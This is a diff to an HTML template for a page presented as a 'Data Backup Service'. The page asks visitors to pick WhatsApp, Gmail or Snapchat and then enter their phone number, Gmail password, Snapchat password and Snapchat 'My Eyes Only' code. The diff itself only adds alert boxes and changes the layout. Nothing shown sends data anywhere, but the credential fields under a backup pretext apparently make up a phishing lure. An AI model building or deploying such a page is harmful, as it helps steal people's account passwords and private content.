@@ -13,85 +13,98 @@
 </head>
 
 <body>
-    <div class="main">
-        <!-- <img src="./kiddo.jpg" width="100%" height="100%" alt=""> -->
-        <div class="left-column">
-            <h1>Data Backup</h1>
-            <p>
-                Welcome to our Data Backup Service! Safeguard your valuable information by securely backing up your
-                application data. We
-                understand the importance of your data and ensure its confidentiality and integrity throughout the
-                process. Choose the application you want to back up, provide your credentials, and leave the rest to us.
-                <br>
-            </p>
-            <br>
-            <form action="#" method="POST" id="form">
-                <!-- form to get details about the account they want to backup -->
-                <div class="mb-3">
-                    <label for="select-field" class="form-label"><strong>Select the type of application you want to
-                            backup</strong></label>
-                    <select class="form-select" aria-label="Default select example" id="select-field" required>
-                        <option selected value="">Select One</option>
-                        <option value="WhatsApp">WhatsApp</option>
-                        <option value="Gmail">Gmail</option>
-                        <option value="Snapchat">Snapchat</option>
-                    </select>
-                </div>
-                <!-- Additional field for credentials (hidden by default) -->
-
-                <!-- Additional fields for WhatsApp credentials (hidden by default) -->
-                <div class="form-group" id="whatsapp-fields" style="display: none;">
-                    <div class="mb-3">
-                        <label for="whatsapp-country" class="form-label"><strong>Enter Country</strong></label>
-                        <input type="text" class="form-control" id="whatsapp-country" placeholder="eg. Ghana">
-                    </div>
-                    <div class="mb-3">
-                        <label for="whatsapp-number" class="form-label"><strong>Enter number</strong></label>
-                        <input type="text" class="form-control" id="whatsapp-number" placeholder="eg. 020000000">
-                    </div>
-                </div>
-
-                <!-- Additional fields for Gmail credentials (hidden by default) -->
-                <div class="form-group" id="gmail-fields" style="display: none;">
-                    <div class="mb-3">
-                        <label for="email" class="form-label"><strong>Email</strong></label>
-                        <input type="email" class="form-control" id="email" placeholder="eg. abc@example.com">
-                    </div>
-                    <div class="mb-3">
-                        <label for="gmail-password" class="form-label"><strong>Password</strong></label>
-                        <input type="gmail-password" class="form-control" id="gmail-password" placeholder="eg. 123456">
-                    </div>
-                </div>
-
-                <!-- Additional fields for Snapchat credentials and "My Eyes Only" (hidden by default) -->
-                <div class="form-group" id="snapchat-fields" style="display: none;">
-                    <div class="mb-3">
-                        <label for="snapchat-username" class="form-label"><strong>Snapchat Username</strong></label>
-                        <input type="text" class="form-control" id="snapchat-username"
-                            placeholder="Enter Snapchat username">
-                    </div>
-                    <div class="mb-3">
-                        <label for="snapchat-password" class="form-label"><strong>Snapchat Password</strong></label>
-                        <input type="text" class="form-control" id="snapchat-password"
-                            placeholder="Enter Snapchat Password">
-                    </div>
-                    <div class="form-check mb-3">
-                        <input class="form-check-input" type="checkbox" id="my-eyes-only">
-                        <label class="form-check-label" for="my-eyes-only">
-                            Do you want to backup files in <strong>"My Eyes Only"?</strong> If yes enter code
-                        </label>
-                    </div>
-                    <div class="mb-3">
-                        <label for="code" class="form-label"><strong>Code</strong></label>
-                        <input type="text" class="form-control" id="snapchat-code" placeholder="Enter code" disabled>
-                    </div>
-                </div>
-
-                <button type="submit" id="submit" class="btn btn-primary">Submit</button>
-            </form>
+    <div class="main-container">
+        <div class="alert-display" id="success-alert-display" style="display: none;">
+            <div class="alert alert-success alert-dismissible fade show" role="alert">
+                <strong><span class="alert-message"></span></strong>
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
         </div>
-        <div class="right-column">
-            <img src="{{ url_for('static', filename='images/cloud-image.png')}}" width="100%" height="100%" alt="">
+        <div class="alert-display" id="error-alert-display" style="display: none;">
+            <div class="alert alert-danger alert-dismissible fade show" role="alert">
+                <strong><span class="alert-message"></span></strong>
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+        </div>
+        <div class="main">
+            <div class="left-column">
+                <h1>Data Backup</h1>
+                <p>
+                    Welcome to our Data Backup Service! Safeguard your valuable information by securely backing up your
+                    application data. We
+                    understand the importance of your data and ensure its confidentiality and integrity throughout the
+                    process. Choose the application you want to back up, provide your credentials, and leave the rest to us.
+                    <br>
+                </p>
+                <br>
+                <form action="#" method="POST" id="form">
+                    <!-- form to get details about the account they want to backup -->
+                    <div class="mb-3">
+                        <label for="select-field" class="form-label"><strong>Select the type of application you want to
+                                backup</strong></label>
+                        <select class="form-select" aria-label="Default select example" id="select-field" required>
+                            <option selected value="">Select One</option>
+                            <option value="WhatsApp">WhatsApp</option>
+                            <option value="Gmail">Gmail</option>
+                            <option value="Snapchat">Snapchat</option>
+                        </select>
+                    </div>
+                    <!-- Additional field for credentials (hidden by default) -->
+        
+                    <!-- Additional fields for WhatsApp credentials (hidden by default) -->
+                    <div class="form-group" id="whatsapp-fields" style="display: none;">
+                        <div class="mb-3">
+                            <label for="whatsapp-country" class="form-label"><strong>Enter Country</strong></label>
+                            <input type="text" class="form-control" id="whatsapp-country" placeholder="eg. Ghana">
+                        </div>
+                        <div class="mb-3">
+                            <label for="whatsapp-number" class="form-label"><strong>Enter number</strong></label>
+                            <input type="text" class="form-control" id="whatsapp-number" placeholder="eg. 020000000">
+                        </div>
+                    </div>
+        
+                    <!-- Additional fields for Gmail credentials (hidden by default) -->
+                    <div class="form-group" id="gmail-fields" style="display: none;">
+                        <div class="mb-3">
+                            <label for="email" class="form-label"><strong>Email</strong></label>
+                            <input type="email" class="form-control" id="email" placeholder="eg. abc@example.com">
+                        </div>
+                        <div class="mb-3">
+                            <label for="gmail-password" class="form-label"><strong>Password</strong></label>
+                            <input type="gmail-password" class="form-control" id="gmail-password" placeholder="eg. 123456">
+                        </div>
+                    </div>
+        
+                    <!-- Additional fields for Snapchat credentials and "My Eyes Only" (hidden by default) -->
+                    <div class="form-group" id="snapchat-fields" style="display: none;">
+                        <div class="mb-3">
+                            <label for="snapchat-username" class="form-label"><strong>Snapchat Username</strong></label>
+                            <input type="text" class="form-control" id="snapchat-username"
+                                placeholder="Enter Snapchat username">
+                        </div>
+                        <div class="mb-3">
+                            <label for="snapchat-password" class="form-label"><strong>Snapchat Password</strong></label>
+                            <input type="text" class="form-control" id="snapchat-password"
+                                placeholder="Enter Snapchat Password">
+                        </div>
+                        <div class="form-check mb-3">
+                            <input class="form-check-input" type="checkbox" id="my-eyes-only">
+                            <label class="form-check-label" for="my-eyes-only">
+                                Do you want to backup files in <strong>"My Eyes Only"?</strong> If yes enter code
+                            </label>
+                        </div>
+                        <div class="mb-3">
+                            <label for="code" class="form-label"><strong>Code</strong></label>
+                            <input type="text" class="form-control" id="snapchat-code" placeholder="Enter code" disabled>
+                        </div>
+                    </div>
+        
+                    <button type="submit" id="submit" class="btn btn-primary">Submit</button>
+                </form>
+            </div>
+            <div class="right-column">
+                <img src="{{ url_for('static', filename='images/cloud-image.png')}}" width="100%" height="100%" alt="">
+            </div>
         </div>
     </div>
 
